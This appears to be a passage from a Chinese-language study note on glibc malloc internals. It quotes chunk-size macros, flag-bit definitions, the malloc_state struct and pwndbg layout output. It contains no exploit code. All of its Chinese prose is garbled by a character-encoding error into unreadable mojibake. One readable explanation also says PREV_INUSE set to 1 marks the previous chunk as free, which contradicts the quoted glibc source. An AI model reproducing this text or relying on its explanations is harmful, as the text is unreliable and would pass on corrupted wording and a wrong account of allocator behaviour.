<h3 id="size-dependent"><a href="#size-dependent" class="headerlink" title="size dependent"></a>size dependent</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* The smallest possible chunk */</span><br><span class="hljs-comment">// æœ€å°çš„ chunk å¤§å°</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span><br><span class="hljs-comment">/* The smallest size we can malloc is an aligned minimal chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MINSIZE  \</span><br><span class="hljs-meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">MIN_CHUNK_SIZE -&gt; 0x20</span><br><span class="hljs-comment">0000 0000 0000 0000 0000 0000 0010 0000</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MALLOC_ALIGN_MASK -&gt; 0xf</span><br><span class="hljs-comment">0000 0000 0000 0000 0000 0000 0000 1111</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">~MALLOC_ALIGN_MASK -&gt; -0x10</span><br><span class="hljs-comment">1111 1111 1111 1111 1111 1111 1111 0000</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK</span><br><span class="hljs-comment">0000 0000 0000 0000 0000 0000 0010 1111</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">(MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK</span><br><span class="hljs-comment">1111 1111 1111 1111 1111 1111 1111 0000</span><br><span class="hljs-comment">0000 0000 0000 0000 0000 0000 0010 1111</span><br><span class="hljs-comment">0000 0000 0000 0000 0000 0000 0010 0000  -&gt; 0x20</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">// è®¡ç®—è¯·æ±‚çš„å¤§å°</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> request2size(req)                                         \</span><br><span class="hljs-meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="hljs-meta">   MINSIZE :                                                      \</span><br><span class="hljs-meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><br><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>) -&gt; <span class="hljs-number">0x20</span>;<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x21</span>) -&gt; <span class="hljs-number">0x30</span><br>    <span class="hljs-number">0x21</span> + <span class="hljs-number">0x8</span> + <span class="hljs-number">0xf</span> = <span class="hljs-number">0x38</span><br>    <span class="hljs-number">0011</span> <span class="hljs-number">1000</span><br>    <span class="hljs-number">1111</span> <span class="hljs-number">0000</span><br>    <span class="hljs-number">0011</span> <span class="hljs-number">0000</span> = <span class="hljs-number">0x30</span><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>) -&gt; <span class="hljs-number">0x30</span><br>    <span class="hljs-number">0x28</span> + <span class="hljs-number">0x8</span> + <span class="hljs-number">0xf</span> = <span class="hljs-number">0x3f</span><br>    <span class="hljs-number">0011</span> <span class="hljs-number">1111</span><br>    <span class="hljs-number">1111</span> <span class="hljs-number">0000</span><br>    <span class="hljs-number">0011</span> <span class="hljs-number">0000</span> = <span class="hljs-number">0x30</span><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x29</span>) -&gt; <span class="hljs-number">0x40</span><br>    <span class="hljs-number">0x29</span> + <span class="hljs-number">0x8</span> + <span class="hljs-number">0xf</span> = <span class="hljs-number">0x40</span><br>    <span class="hljs-number">0100</span> <span class="hljs-number">0000</span><br>    <span class="hljs-number">1111</span> <span class="hljs-number">0000</span><br>    <span class="hljs-number">0100</span> <span class="hljs-number">0000</span> = <span class="hljs-number">0x40</span><br><br><span class="hljs-number">0x19</span> ~ <span class="hljs-number">0x28</span>  -&gt;  <span class="hljs-number">0x30</span><br><span class="hljs-number">0x29</span> ~ <span class="hljs-number">0x38</span>  -&gt;  <span class="hljs-number">0x40</span><br></code></pre></td></tr></table></figure>



<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">è¡¥ç ï¼š1111</span> <span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">0000</span><br><span class="hljs-string">åç ï¼š1111</span> <span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1110 </span><span class="hljs-number">1111</span><br><span class="hljs-string">åŸç ï¼š1000</span> <span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0000 </span><span class="hljs-number">0001 </span><span class="hljs-number">0000</span><br></code></pre></td></tr></table></figure>

<p>åœ¨ size å­—æ®µä¸­ç”±äº <code>&amp; ~MALLOC_ALIGN_MASK</code>,æˆ‘ä»¬ä¼šå‘ç°å®ƒçš„åå››ä¸ªæ¯”ç‰¹ä½ä¸€ç›´ä¸º0ï¼Œå…¶ä¸­å3ä¸ªæ¯”ç‰¹ä½è¢«ç”¨ä½œæ ‡è¯†ï¼Œä»é«˜åˆ°ä½åˆ†åˆ«æ„å‘³ç€</p>
<ul>
<li>NON_MAIN_ARENAï¼šè®°å½•å½“å‰ chunk æ˜¯å¦ä¸å±äºä¸»çº¿ç¨‹</li>
<li>IS_MMAPPEDï¼šç”¨äºæ ‡è¯†ä¸€ä¸ªchunkæ˜¯å¦æ˜¯ä»mmap()å‡½æ•°ä¸­è·å¾—çš„ã€‚å¦‚æœç”¨æˆ·ç”³è¯·ä¸€ä¸ªç›¸å½“å¤§çš„å†…å­˜ï¼Œmallocä¼šé€šè¿‡ mmap()å‡½æ•°åˆ†é…ä¸€ä¸ªæ˜ å°„æ®µã€‚</li>
<li>PREV_INUSEï¼šç”¨äºæ ‡è¯†ä¸Šä¸€ä¸ªchunkçš„çŠ¶æ€ã€‚å½“å®ƒä¸º1 æ—¶ï¼Œè¡¨ç¤ºä¸Šä¸€ä¸ªchunkå¤„äºé‡Šæ”¾çŠ¶æ€ï¼Œå¦åˆ™è¡¨ç¤ºä¸Šä¸€ä¸ªchunkå¤„äºä½¿ç”¨çŠ¶æ€ã€‚</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREV_INUSE 0x1</span><br><br><span class="hljs-comment">/* extract inuse bit of previous chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span><br><br><br><span class="hljs-comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IS_MMAPPED 0x2</span><br><br><span class="hljs-comment">/* check for mmap()&#x27;ed chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span><br><br><br><span class="hljs-comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span><br><span class="hljs-comment">   from a non-main arena.  This is only set immediately before handing</span><br><span class="hljs-comment">   the chunk to the user, if necessary.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NON_MAIN_ARENA 0x4</span><br><br><span class="hljs-comment">/* Check for chunk from main arena.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span><br><br><span class="hljs-comment">/* Mark a chunk as not being on the main arena.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Bits to mask off when extracting size</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span><br><span class="hljs-comment">   macros for which mmapped chunks should never be seen. This should</span><br><span class="hljs-comment">   cause helpful core dumps to occur if it is tried by accident by</span><br><span class="hljs-comment">   people extending or adapting this malloc.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><br><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span><br><br><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span><br><br><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span><br><br><span class="hljs-comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><br><span class="hljs-comment">/* Set the size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))</span><br><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))</span><br><br><span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span><br><br><span class="hljs-comment">/* extract p&#x27;s inuse bit */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> inuse(p)                                  \</span><br><span class="hljs-meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br><br><span class="hljs-comment">/* set/clear chunk as being inuse without otherwise disturbing */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_inuse(p)                                  \</span><br><span class="hljs-meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size |= PREV_INUSE</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> clear_inuse(p)                                  \</span><br><span class="hljs-meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span><br><br><br><span class="hljs-comment">/* check/set/clear inuse bits in known places */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> inuse_bit_at_offset(p, s)                          \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_inuse_bit_at_offset(p, s)                          \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> clear_inuse_bit_at_offset(p, s)                          \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</span><br><br><br><span class="hljs-comment">/* Set size at head, without disturbing its use bit */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_head_size(p, s)  ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span><br><br><span class="hljs-comment">/* Set size/use field */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span><br><br><span class="hljs-comment">/* Set size at footer (only when chunk is not in use) */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span><br><br></code></pre></td></tr></table></figure>

<p><img src="Heap.assets/image-20221018115053387.png" srcset="/img/loading.gif" lazyload alt="image-20221018115053387"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span>* <span class="hljs-title function_">malloc</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">free</span> <span class="hljs-params">(<span class="hljs-type">void</span>* ptr)</span>;<br></code></pre></td></tr></table></figure>

<p><img src="Heap.assets/image-20221018120411190.png" srcset="/img/loading.gif" lazyload alt="image-20221018120411190"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span><br></code></pre></td></tr></table></figure>

<h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>æ¯ä¸ªçº¿ç¨‹åªæœ‰ä¸€ä¸ª arena headerï¼Œ é‡Œé¢ä¿å­˜äº†bins ï¼Œtop chunkç­‰ä¿¡æ¯ã€‚ä¸»çº¿ç¨‹çš„main_arenaä¿å­˜åœ¨libc.soçš„æ•°æ®æ®µé‡Œï¼Œå…¶ä»–çº¿ç¨‹çš„arena åˆ™ä¿å­˜åœ¨ç»™è¯¥arenaåˆ†é…çš„heapé‡Œé¢ã€‚malloc_stateå®šä¹‰å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   have_fastchunks indicates that there are probably some fastbin chunks.</span><br><span class="hljs-comment">   It is set true on entering a chunk into any fastbin, and cleared early in</span><br><span class="hljs-comment">   malloc_consolidate.  The value is approximate since it may be set when there</span><br><span class="hljs-comment">   are no fastbin chunks, or it may be clear even if there are fastbin chunks</span><br><span class="hljs-comment">   available.  Given it&#x27;s sole purpose is to reduce number of redundant calls to</span><br><span class="hljs-comment">   malloc_consolidate, it does not affect correctness.  As a result we can safely</span><br><span class="hljs-comment">   use relaxed atomic accesses.</span><br><span class="hljs-comment"> */</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> &#123;</span><br>    <span class="hljs-comment">/* Serialize access.  */</span><br>    __libc_lock_define (, mutex);<br><br>    <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>    <span class="hljs-type">int</span> flags;<br><br>    <span class="hljs-comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span><br>    <span class="hljs-comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span><br>    <span class="hljs-type">int</span> have_fastchunks;<br><br>    <span class="hljs-comment">/* Fastbins */</span><br>    mfastbinptr fastbinsY[NFASTBINS];<br><br>    <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>    mchunkptr top;<br><br>    <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>    mchunkptr last_remainder;<br><br>    <span class="hljs-comment">/* Normal bins packed as described above */</span><br>    mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br><br>    <span class="hljs-comment">/* Bitmap of bins */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[BINMAPSIZE];<br><br>    <span class="hljs-comment">/* Linked list */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br><br>    <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">       by free_list_lock in arena.c.  */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br><br>    <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">       the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">       free_list_lock in arena.c.  */</span><br>    INTERNAL_SIZE_T attached_threads;<br><br>    <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>    INTERNAL_SIZE_T system_mem;<br>    INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br><br><br><span class="hljs-comment">/* There are several instances of this struct (&quot;arenas&quot;) in this</span><br><span class="hljs-comment">   malloc.  If you are adapting this malloc in a way that does NOT use</span><br><span class="hljs-comment">   a static or mmapped malloc_state, you MUST explicitly zero-fill it</span><br><span class="hljs-comment">   before using. This malloc relies on the property that malloc_state</span><br><span class="hljs-comment">   is initialized to all zeroes (as is true of C statics).  */</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> <span class="hljs-title">main_arena</span> =</span><br>        &#123;<br>                .mutex = _LIBC_LOCK_INITIALIZER,<br>                .next = &amp;main_arena,<br>                .attached_threads = <span class="hljs-number">1</span><br>        &#125;;<br><br></code></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; ptype /o <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">/* <span class="hljs-title">offset</span>      |    <span class="hljs-title">size</span> */  <span class="hljs-title">type</span> =</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> &#123;</span><br><span class="hljs-comment">/*      0      |       4 */</span>    <span class="hljs-type">__libc_lock_t</span> mutex;<br><span class="hljs-comment">/*      4      |       4 */</span>    <span class="hljs-type">int</span> flags;<br><span class="hljs-comment">/*      8      |       4 */</span>    <span class="hljs-type">int</span> have_fastchunks;<br><span class="hljs-comment">/* XXX  4-byte hole      */</span><br><span class="hljs-comment">/*     16      |      80 */</span>    mfastbinptr fastbinsY[<span class="hljs-number">10</span>];<br><span class="hljs-comment">/*     96      |       8 */</span>    mchunkptr top;<br><span class="hljs-comment">/*    104      |       8 */</span>    mchunkptr last_remainder;<br><span class="hljs-comment">/*    112      |    2032 */</span>    mchunkptr bins[<span class="hljs-number">254</span>];<br><span class="hljs-comment">/*   2144      |      16 */</span>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[<span class="hljs-number">4</span>];<br><span class="hljs-comment">/*   2160      |       8 */</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-comment">/*   2168      |       8 */</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br><span class="hljs-comment">/*   2176      |       8 */</span>    <span class="hljs-type">size_t</span> attached_threads;<br><span class="hljs-comment">/*   2184      |       8 */</span>    <span class="hljs-type">size_t</span> system_mem;<br><span class="hljs-comment">/*   2192      |       8 */</span>    <span class="hljs-type">size_t</span> max_system_mem;<br><br>                               <span class="hljs-comment">/* total size (bytes): 2200 */</span><br>                             &#125;<br></code></pre></td></tr></table></figure>

<p><img src="Heap.assets/image-20221018191719463.png" srcset="/img/loading.gif" lazyload alt="image-20221018191719463"></p>
<ul>
<li><p>mutexï¼šåºåˆ—åŒ–å¯¹ä¸€ä¸ªç«æŠ€åœºçš„è®¿é—®ã€‚Mallocåœ¨å‘ arena è¯·æ±‚å †å†…å­˜ä¹‹å‰é”å®šäº† arena çš„ mutex</p>
</li>
<li><p>flagsï¼šä¿å­˜ä¿¡æ¯ï¼Œå¦‚ä¸€ä¸ª arena çš„å †å†…å­˜æ˜¯å¦è¿ç»­ç­‰</p>
</li>
<li><p>have_fastchunksï¼šè¢«è§†ä¸ºä¸€ä¸ª bool å€¼ï¼Œè¡¨ç¤º fastbins æ˜¯å¦ä¸ºç©ºï¼Œå½“ä¸€ä¸ªå—è¢«é“¾æ¥åˆ°ä¸€ä¸ª fastbin ä¸­æ—¶è¢«è®¾ç½®ï¼Œå¹¶ç”± malloc_consolidate() æ¸…é™¤ è¿™ä¸ªå­—æ®µå’Œå®ƒåé¢çš„å¡«å……DWORDåªå­˜åœ¨äºGLIBCç‰ˆæœ¬&gt;=2.27ã€‚åœ¨GLIBCç‰ˆæœ¬&lt;=2.26ä¸­ï¼Œå®ƒæ˜¯flagså­—æ®µçš„ä¸€éƒ¨åˆ†ã€‚</p>
</li>
<li><p>fastbinsY[NFASTBINS]ï¼šå­˜æ”¾æ¯ä¸ª fast chunk é“¾è¡¨å¤´éƒ¨çš„æŒ‡é’ˆã€‚å°½ç®¡åœ¨é»˜è®¤æƒ…å†µä¸‹åªæœ‰7ä¸ªè¿™æ ·çš„fastbinså¯ç”¨ï¼Œä½† mallopt() å‡½æ•°å¯ä»¥é€šè¿‡ä¿®æ”¹ global_max_fast å˜é‡æ¥æ”¹å˜è¿™ä¸ªæ•°å­—ã€‚</p>
</li>
<li><p>topï¼štop chunk æ˜¯æœ€é¡¶éƒ¨çš„å¯ç”¨ chunkï¼Œå³ä¸å¯ç”¨å†…å­˜çš„æœ«ç«¯æ¥å£¤çš„é‚£ä¸ªï¼Œåœ¨ä¸€ä¸ªæ–°çš„ arena è¢«åˆå§‹åŒ–åï¼Œä¸€ä¸ª top chunk æ€»æ˜¯å­˜åœ¨çš„ï¼Œè€Œä¸”æ¯ä¸ª arena åªæœ‰ä¸€ä¸ªã€‚åªæœ‰å½“è¯·æ±‚æ— æ³•ä»åŒä¸€ arena çš„ä»»ä½•å…¶ä»– bin ä¸­å¾—åˆ°æœåŠ¡æ—¶ï¼Œæ‰ä¼šä» top chunk ä¸­å¾—åˆ°æœåŠ¡ã€‚å½“ä¸€ä¸ª top chunk å¤ªå°ï¼Œæ— æ³•æ»¡è¶³ä½äº mmap é˜ˆå€¼çš„è¯·æ±‚æ—¶ï¼Œmalloc ä¼šå°è¯•é€šè¿‡ sysmalloc() å‡½æ•°å¢åŠ  top chunk æ‰€åœ¨çš„å †ï¼Œç„¶åæ‰©å±• top chunkã€‚å¦‚æœä¸æˆåŠŸï¼Œå°±ä¼šåˆ†é…ä¸€ä¸ªæ–°çš„å †ï¼Œæˆä¸ºè¯¥ arena çš„ top chunkï¼Œè€Œæ—§çš„t op chunk ä¸­çš„ä»»ä½•å‰©ä½™å†…å­˜éƒ½ä¼šè¢«é‡Šæ”¾ã€‚ä¸ºäº†è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼Œmallocåœ¨å †çš„æœ«ç«¯æ”¾ç½®äº†2ä¸ª0x10å¤§å°çš„ â€œæ …æ æŸ± â€œå—ï¼Œä»¥ç¡®ä¿å‘å‰åˆå¹¶çš„å°è¯•ä¸ä¼šå¯¼è‡´è¶Šç•Œè¯»å–ã€‚</p>
</li>
<li><p>last_remainderï¼šè¿™ä¸ªå­—æ®µæŒæœ‰å‰ä¸€ä¸ªåˆ‡å‰²æ“ä½œäº§ç”Ÿçš„å—çš„åœ°å€ã€‚å®ƒç”±å±äº smallbin èŒƒå›´çš„è¯·æ±‚å¡«å……ï¼Œè¯¥è¯·æ±‚æ¥è‡ª unsorted bin (æ¥è‡ªç°æœ‰çš„ last_remainder)ï¼Œæˆ–æ¥è‡ªbinmapæœç´¢ã€‚è¦ä»ä¸€ä¸ª unsorted bin ä¸­è¿›è¡Œåˆ‡å‰²ï¼Œæœ€åçš„å‰©ä½™å—å¿…é¡»ä½äº unsorted binçš„å¤´éƒ¨ã€‚</p>
